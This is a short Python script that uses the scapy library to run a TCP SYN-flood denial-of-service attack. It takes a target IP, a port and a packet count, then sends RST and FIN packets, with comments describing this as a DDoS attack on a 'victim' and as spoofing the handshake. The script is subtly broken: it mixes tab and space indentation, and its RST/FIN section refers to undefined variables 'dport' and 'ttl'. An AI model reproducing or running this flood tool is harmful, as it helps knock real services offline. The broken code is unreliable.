import sys
import datetime
import optparse
from scapy.all import *

# function to parse command line args
def get_arguments():
        parser = optparse.OptionParser()
        parser.add_option("-t", "--target", dest="target",
                help="Target IP.")
	parser.add_option("-p", "--port", dest="port",
		help="Port to flood (80).")
	parser.add_option("-l", "--payload", dest="payload",
		help="Amount of SYN packets to send (65000).")
        options, arguments = parser.parse_args()
        return options

# function to perform the flood
def flood (victim_ip, port, payload):
 	SYNpkt = IP(dst=victim_ip, ttl=20)
 	tcp = TCP(sport=1500, dport=port, flags="S")

	print("\nStarting SYN flood DDoS attack...")
	# number of packets according to payload
	counter = (0 - 1) # 0 is an index, so...
	for i in range(0, int(payload)):
		counter += 1

		print("Sent packet: %i" % counter)
		# actually send the packet
		send(SYNpkt/tcp, verbose=0)

	# after you send all SYN, send an RST and FIN
	# to ensure the connection is closed
	RSTpkt = TCP(sport=1500, dport=int(dport), flags="R")
	FINpkt = TCP(sport=1500, dport=int(dport),flags="F")


	print("Sending RST packet to reset...")
	send(IP(dst=victim_ip, ttl=ttl)/RSTpkt, verbose=0) # reset connection

	print("Sending FIN to end connection...")
	send(IP(dst=victim_ip, ttl=ttl)/FINpkt, verbose=0) # assure victim
	# that we have no more business with them
	# effectively spoofing our
	# entire previous handshake


options = get_arguments()
target = options.target
port = int(options.port); payload = int(options.payload)

try:
        # call the flood function which will do all the required printing
        flood(target, port, payload)
except KeyboardInterrupt as interrupt:
        print("Quitting...")
        sys.exit(0) # quit and raise no error

